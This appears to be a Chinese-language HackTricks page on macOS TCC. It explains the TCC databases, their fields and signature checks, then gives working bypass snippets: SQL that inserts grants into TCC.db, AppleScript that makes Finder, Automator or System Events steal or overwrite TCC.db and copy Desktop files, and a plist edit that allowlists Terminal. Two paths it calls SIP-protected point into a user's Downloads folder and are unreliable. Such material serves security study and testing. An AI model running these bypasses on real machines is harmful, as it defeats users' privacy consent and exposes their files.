# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **基本信息**

**TCC（Transparency, Consent, and Control）** 是一种专注于规范应用程序权限的安全协议。其主要作用是保护**位置服务、联系人、照片、麦克风、摄像头、辅助功能和完整磁盘访问**等敏感功能。通过要求用户明确同意后才授予应用程序访问这些功能的权限，TCC 增强了隐私保护以及用户对其数据的控制。

当应用程序请求访问受保护的功能时，用户会遇到 TCC。系统会显示一个提示，允许用户**批准或拒绝访问**。此外，TCC 还支持用户直接执行的操作，例如**将文件拖放到应用程序中**，以授予应用程序访问特定文件的权限，从而确保应用程序只能访问明确获准访问的内容。

![TCC 提示示例](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** 由位于 `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` 的 **daemon** 处理，并在 `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` 中进行配置（注册 mach service `com.apple.tccd.system`）。

每个已登录用户都会运行一个由 `/System/Library/LaunchAgents/com.apple.tccd.plist` 定义的**用户模式 tccd**，并注册 mach services `com.apple.tccd` 和 `com.apple.usernotifications.delegate.com.apple.tccd`。

下面可以看到以 system 和 user 身份运行的 tccd：
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
权限会**继承自父级**应用，并且会根据 **Bundle ID** 和 **Developer ID** 对**权限**进行**跟踪**。

### TCC 数据库

随后，允许/拒绝信息会存储在一些 TCC 数据库中：

- 系统范围的数据库：**`/Library/Application Support/com.apple.TCC/TCC.db`**。
- 此数据库受 **SIP** 保护，因此只有 SIP bypass 才能写入其中。
- 用户 TCC 数据库 **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**，用于存储每个用户的偏好设置。
- 此数据库受到保护，只有具有较高 TCC 权限的进程（例如 Full Disk Access）才能写入其中（但它不受 SIP 保护）。

> [!WARNING]
> 前述数据库的读取访问也受到 **TCC** 保护。因此，除非来自具有 TCC 权限的进程，否则你**无法读取**常规用户 TCC 数据库。
>
> 但是请记住，具有这些高权限的进程（例如 **FDA** 或 **`kTCCServiceEndpointSecurityClient`**）能够写入用户 TCC 数据库。

- 第三个 TCC 数据库位于 **`/var/db/locationd/clients.plist`**，用于指示获准**访问定位服务**的客户端。
- 受 SIP 保护的文件 **`/Users/carlospolop/Downloads/REG.db`**（读取访问同样受 TCC 保护）包含所有**有效 TCC 数据库**的**位置**。
- 受 SIP 保护的文件 **`/Users/carlospolop/Downloads/MDMOverrides.plist`**（读取访问同样受 TCC 保护）包含更多 TCC 授予的权限。
- 受 SIP 保护的文件 **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`**（但任何人都可以读取）是一个允许列表，其中包含需要 TCC exception 的应用程序。

> [!TIP]
> **iOS** 中的 TCC 数据库位于 **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> **notification center UI** 可以对系统 TCC 数据库进行**更改**：
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> 但是，用户可以使用 **`tccutil`** command line utility **删除或查询规则**。

#### 查询数据库

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> 检查这两个数据库，可以查看应用已允许、已禁止或尚未获取的权限（应用会请求该权限）。

- **`service`** 是 TCC **permission** 的字符串表示形式
- **`client`** 是具有这些权限的 **bundle ID** 或**二进制文件路径**
- **`client_type`** 表示它是 Bundle Identifier(0) 还是绝对路径(1)

<details>

<summary>如果是绝对路径，如何执行</summary>

只需执行 **`launctl load you_bin.plist`**，使用类似如下的 plist：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- **`auth_value`** 可以具有不同的值：denied(0)、unknown(1)、allowed(2) 或 limited(3)。
- **`auth_reason`** 可以具有以下值：Error(1)、User Consent(2)、User Set(3)、System Set(4)、Service Policy(5)、MDM Policy(6)、Override Policy(7)、Missing usage string(8)、Prompt Timeout(9)、Preflight Unknown(10)、Entitled(11)、App Type Policy(12)
- **`csreq`** 字段用于指示如何验证要执行的二进制文件并授予 TCC 权限：
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- 如需了解表格中**其他字段**的更多信息，[**请查看这篇博客文章**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)。<sup>[[1]](#references)</sup>

你还可以在 `System Preferences --> Security & Privacy --> Privacy --> Files and Folders` 中查看应用的**已有权限**。

> [!TIP]
> 用户_可以_使用 **`tccutil`** **删除或查询规则**。

#### 重置 TCC 权限
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC Signature Checks

TCC **database** 存储应用的 **Bundle ID**，但也会 **存储** 有关 **signature** 的 **信息**，以 **确保** 请求使用权限的 **App** 是正确的应用。
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> 因此，使用相同名称和 bundle ID 的其他应用将无法访问授予其他应用的权限。

### Entitlements 与 TCC 权限

应用**不仅需要**请求并且已经**获得对某些资源的访问权限**，还需要**具备相关的 entitlements**。\
例如，**Telegram** 具有 `com.apple.security.device.camera` entitlement，可请求**访问摄像头**。没有此 **entitlement** 的**应用**将**无法**访问摄像头（用户甚至不会被询问是否授予权限）。

请注意，entitlements 是 plist 文件，也是 code sig 的一部分；它们会通过特殊 slots 在 code sig 中进一步进行哈希处理，并且既可以由 kernel code 在 kernel 中查询，也可以由 user model code 使用 `csops(#169)` 或 `csops_audittoken(#170)` 查询。

但是，应用要**访问**某些**用户文件夹**，例如 `~/Desktop`、`~/Downloads` 和 `~/Documents`，**不需要**具备任何特定的 **entitlements**。系统会根据需要透明地处理访问并**提示用户**。

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Apple 的应用**不会生成提示**。它们的 **entitlements** 列表中包含**预先授予的权限**，这意味着它们**永远不会生成 popup**，也不会出现在任何 **TCC databases** 中。例如：
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
这将避免 Calendar 向用户请求访问提醒事项、日历和地址簿的权限。

> [!TIP]
> 除了一些关于 entitlements 的官方文档外，还可以在 [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) 中找到非官方的 **有趣的 entitlements 信息**

一些 TCC 权限包括：kTCCServiceAppleEvents、kTCCServiceCalendar、kTCCServicePhotos……目前没有公开列表定义所有权限，但你可以查看这份[**已知权限列表**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service)。<sup>[[1]](#references)</sup>

### 敏感且未受保护的位置

- $HOME（本身）
- $HOME/.ssh、$HOME/.aws 等
- /tmp

### 用户意图 / com.apple.macl

如前所述，可以**通过将文件拖放到 App 上来授予该 App 对文件的访问权限**。此访问权限不会记录在任何 TCC 数据库中，而是作为文件的**扩展** **属性**存在。该属性将**存储获得授权的 App 的 UUID**：<sup>[[2]](#references)</sup>
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!TIP]
> 值得注意的是，**`com.apple.macl`** 属性由 **Sandbox** 管理，而不是由 tccd 管理。
>
> 还要注意，如果你将一个允许计算机上某个 app 的 UUID 访问的文件移动到另一台计算机，由于同一个 app 会具有不同的 UID，因此它不会授予该 app 访问权限。

扩展属性 `com.apple.macl` **无法像其他扩展属性一样被清除**，因为它受 **SIP** 保护。不过，正如[**这篇文章中所解释的**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)，可以通过将文件 **zipping**、**deleting**，然后再 **unzipping** 来禁用它。<sup>[[3]](#references)</sup>






## XNU Responsible Process 机制

在 macOS/iOS 中，**Responsible Process** 机制是一项关键的安全功能，被 **TCC (Transparency, Consent, and Control)** 框架及其他安全系统使用，用于跟踪最终对某项操作负责的进程，即使该操作经过了多层子进程调用链。

当 TCC 检查权限（例如摄像头、麦克风、位置）时，它并不总是检查发出请求的直接进程。相反，它会检查 **Responsible Process**——通常是发起该操作的 GUI 应用，即使实际请求来自 helper process 或 daemon。

<details>
<summary>Responsible Process 的设置方式</summary>

### Process Structure Fields

XNU 中的每个进程都维护两个关键的 UUID 标识符：
```c
// From bsd/sys/proc_internal.h
struct proc {
// ...
pid_t   p_responsible_pid;          // PID of the responsible process
uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
// ...
};
```
- **`p_uuid`**：进程自身的 UUID（来自其 Mach-O binary 的 `LC_UUID` load command）
- **`p_responsible_pid`**：responsible process 的 PID
- **`p_responsible_uuid`**：responsible process 的 UUID（即使该进程退出后仍会保留）

### Responsible Process 的设置方式

1. **进程创建期间（Fork）**

当通过 `fork()` 或 `posix_spawn()` 创建新进程时，responsible process 会从父进程继承（`exec()` syscall 会复用现有的 `proc` structure，因此不会在此处重复设置）：

**位置**：`bsd/kern/kern_fork.c:1053`
```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```
**关键点：**
- 子进程**继承**父进程的 `p_responsible_pid`
- 这会在进程层级结构中创建一条**责任链**
- 责任进程通常指向最初的 GUI 应用程序

2. **核心函数：`proc_set_responsible_pid()`**

**位置**：`bsd/kern/kern_proc.c:4817-4831`
```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
target_proc->p_responsible_pid = responsible_pid;

if (responsible_pid >= 0) {
proc_t responsible_proc = proc_find(responsible_pid);
if (responsible_proc != PROC_NULL) {
// Copy the responsible process's UUID for persistent identification
proc_getexecutableuuid(responsible_proc,
target_proc->p_responsible_uuid,
sizeof(target_proc->p_responsible_uuid));
proc_rele(responsible_proc);
}
}
return;
}
```
**此函数的作用：**
1. **在目标进程中设置 responsible PID**
2. 使用 `proc_find()` **查找 responsible process**（增加引用计数）
3. 将 responsible process 的 `p_uuid` **复制到**目标进程的 `p_responsible_uuid`
4. 使用 `proc_rele()` **释放引用**（减少引用计数）

3. **为什么同时存储 PID 和 UUID？**

这种双重存储方式解决了一个关键问题：

| 字段 | 用途 | 问题 | 解决方案 |
|-------|---------|---------|----------|
| `p_responsible_pid` | 快速查找当前进程 | 进程退出后 PID 可能被重新使用 | 用于活动进程查找 |
| `p_responsible_uuid` | 持久化标识 | 可在进程终止后继续存在 | 用于安全检查和审计 |

**问题**：如果 responsible process 在子进程之前退出，PID 可能会被回收并分配给完全不同的进程。

**解决方案**：UUID 是不可变的，可以唯一标识负责该进程的特定二进制文件，即使该进程已经退出。

### 进程创建流程
```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
│
│ fork() / posix_spawn()
▼
┌────────────────────────────┐
│ kern_fork.c:fork1_internal │
│                            │
│ proc_set_responsible_pid(  │
│   child_proc,              │
│   parent->p_responsible_pid│
│ );                         │
└────────────┬───────────────┘
│
▼
┌────────────────────────────┐
│ proc_set_responsible_pid() │
│                            │
│ 1. Set p_responsible_pid   │
│ 2. Find responsible proc   │
│ 3. Copy UUID               │
│ 4. Release reference       │
└────────────┬───────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```
### UUID 来源：LC_UUID Load Command

存储在 `p_uuid` 中的 UUID 来自 **Mach-O 可执行文件的 `LC_UUID` load command**：

1. **编译时间**
```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```
2. **执行时间**

**位置**: `bsd/kern/mach_loader.c:2393-2413`
```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
return LOAD_BADMACHO;
}

// Extract UUID from LC_UUID load command
memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
return LOAD_SUCCESS;
}
```
3. **存储在进程结构中**

**位置**：`bsd/kern/kern_exec.c:2281`
```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```
**位置**: `bsd/kern/kern_proc.c:1912-1915`
```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC 提权与绕过

### 插入 TCC

如果你在某个时候成功获得了对 TCC 数据库的写入权限，可以使用类似以下内容来添加条目（删除注释）：

<details>

<summary>插入 TCC 示例</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

如果你成功进入了一个具有某些 TCC 权限的应用，请查看以下包含 TCC payloads 的页面，以利用这些权限：


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

在以下页面了解 Apple Events：


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

Automation 权限的 TCC 名称为：**`kTCCServiceAppleEvents`**\
此特定 TCC 权限还会指示 TCC 数据库中**可以被管理的应用程序**（因此该权限并不允许管理所有内容）。

**Finder** 是一个**始终具有 FDA** 的应用程序（即使它未显示在 UI 中），因此，如果你对它拥有 **Automation** 权限，就可以滥用其权限，**让它执行某些操作**。\
在此情况下，你的应用需要对 **`com.apple.Finder`** 拥有 **`kTCCServiceAppleEvents`** 权限。<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

你可以利用这一点来 **写入自己的用户 TCC 数据库**。

> [!WARNING]
> 拥有此权限后，你将能够 **请求 Finder 访问受 TCC 限制的文件夹**，并让它将文件提供给你；但据我所知，你 **无法让 Finder 执行任意代码**，从而完全滥用其 FDA 访问权限。
>
> 因此，你将无法滥用 FDA 的全部能力。

这是获取 Finder 的 Automation 权限时显示的 TCC 提示：

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> 注意，由于 **Automator** 应用拥有 TCC 权限 **`kTCCServiceAppleEvents`**，它可以 **控制任何应用**，例如 Finder。因此，拥有控制 Automator 的权限后，你也可以使用如下代码控制 **Finder**：

<details>

<summary>在 Automator 内部获取 shell</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

**Script Editor app** 也会发生同样的情况，它可以控制 Finder，但通过 AppleScript 无法强制其执行脚本。

### Automation (SE) to some TCC

**System Events 可以创建 Folder Actions，而 Folder Actions 可以访问某些 TCC 文件夹**（Desktop、Documents 和 Downloads），因此可以使用如下脚本来滥用此行为：
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**) to FDA\*

在 **`System Events`** 上启用 Automation + Accessibility（**`kTCCServicePostEvent`**）后，可以向**进程发送按键**。这样，你可以滥用 Finder 来修改用户的 TCC.db，或向任意 app 授予 FDA（不过执行此操作时可能会要求输入密码）。

Finder 覆盖用户 TCC.db 的示例：
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` 到 FDA\*

查看此页面，了解一些用于滥用 Accessibility 权限的 [**payloads**](macos-tcc-payloads.md#accessibility)，例如通过 privesc 获取 FDA\* 或运行 keylogger。

### **Endpoint Security Client 到 FDA**

如果你拥有 **`kTCCServiceEndpointSecurityClient`**，你就拥有 FDA。结束。

### System Policy SysAdmin File 到 FDA

**`kTCCServiceSystemPolicySysAdminFiles`** 允许**更改**用户的 **`NFSHomeDirectory`** 属性，从而更改其 home folder，因此可以**绕过 TCC**。<sup>[[5]](#references)</sup>

### User TCC DB 到 FDA

获得对**用户 TCC**数据库的**写权限**后，你**不能**授予自己 **`FDA`** 权限；只有位于 system database 中的数据库才能授予该权限。

但你**可以**授予自己**对 Finder 的 Automation 权限**，然后滥用之前的技术将权限提升至 FDA\*。

### **FDA 到 TCC permissions**

**Full Disk Access** 在 TCC 中的名称是 **`kTCCServiceSystemPolicyAllFiles`**

我不认为这是真正的 privesc，但以防你觉得有用：如果你控制了一个拥有 FDA 的程序，就可以**修改用户的 TCC database 并授予自己任何访问权限**。如果你可能失去 FDA 权限，这可以作为一种 persistence 技术。

### **SIP Bypass 到 TCC Bypass**

系统的 **TCC database** 受到 **SIP** 保护，这就是为什么只有具有**指定 entitlements 的进程才能修改**它。因此，如果攻击者发现了针对某个**文件**的 **SIP bypass**（能够修改受 SIP 限制的文件），他将能够：

- **移除** TCC database 的保护，并授予自己所有 TCC permissions。例如，他可以滥用以下任一文件：
- TCC systems database
- REG.db
- MDMOverrides.plist

不过，还有另一种滥用此 **SIP bypass 来绕过 TCC** 的方式：文件 `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` 是一个允许列表，其中包含需要 TCC exception 的应用程序。因此，如果攻击者能够**移除**该文件的 **SIP protection** 并添加他**自己的应用程序**，该应用程序就能够绕过 TCC。\
例如，要添加 terminal：
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC 绕过


{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## References

- [1] [深入分析 macOS TCC.db - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - 用于跟踪 com.apple.macl 的脚本（brunerd 的 Gist）](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [跟踪并处理 com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [意外且有意地绕过 macOS TCC 用户隐私保护](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [更改主目录并绕过 TCC，即 CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
{{#include ../../../../banners/hacktricks-training.md}}
